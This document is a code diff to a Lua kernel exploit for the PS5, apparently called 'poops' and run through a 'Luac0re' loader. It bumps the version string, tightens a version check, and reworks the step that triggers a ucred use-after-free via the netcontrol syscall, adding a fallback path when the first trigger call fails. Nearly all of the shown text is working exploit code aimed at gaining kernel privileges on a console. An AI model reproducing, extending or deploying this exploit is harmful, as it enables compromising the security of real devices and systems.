@@ -145,13 +145,13 @@ local function build_rthdr(buf, target_size)
 end
 
 function poops_ps5()
-    send_notification("Luac0re poops 1.2 by egycnq")
+    send_notification("Luac0re poops 1.3 by egycnq")
 
     if not fw_offsets then
         error("Update Luac0re to at least 2.2c version")
     end
     
-    if gpu.close then
+    if gpu.close or kill_app then
         error("Update Luac0re to at least 2.2c version")
     end
 
@@ -628,16 +628,28 @@ function poops_ps5()
         -- trigger ucred UAF via netcontrol
         local discard_sock = create_socket(AF_UNIX, SOCK_STREAM, 0)
         local sock_buf = malloc(8); write32(sock_buf, discard_sock)
-        syscall.netcontrol(-1, 0x20000003, sock_buf, 8)
-        syscall.close(discard_sock)
-        syscall.setuid(1)
-
-        uaf_socket = create_socket(AF_UNIX, SOCK_STREAM, 0)
-        syscall.setuid(1)
-
-        local ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
-        syscall.netcontrol(-1, 0x20000007, ctrl_buf, 8)
-
+        
+        if syscall.netcontrol(-1, 0x20000003, sock_buf, 8) == 0 then
+            syscall.close(discard_sock)
+            syscall.setuid(1)
+    
+            uaf_socket = create_socket(AF_UNIX, SOCK_STREAM, 0)
+            syscall.setuid(1)
+    
+            local ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
+            syscall.netcontrol(-1, 0x20000007, ctrl_buf, 8)
+        else
+            syscall.netcontrol(1, 0x20000003, sock_buf, 8)
+            syscall.close(discard_sock)
+            syscall.setuid(1)
+    
+            uaf_socket = create_socket(AF_UNIX, SOCK_STREAM, 0)
+            syscall.setuid(1)
+    
+            local ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
+            syscall.netcontrol(1, 0x20000007, ctrl_buf, 8)
+        end
+        
         -- flush iov workers to stabilize
         for _ = 1, 32 do
             signal_iov()
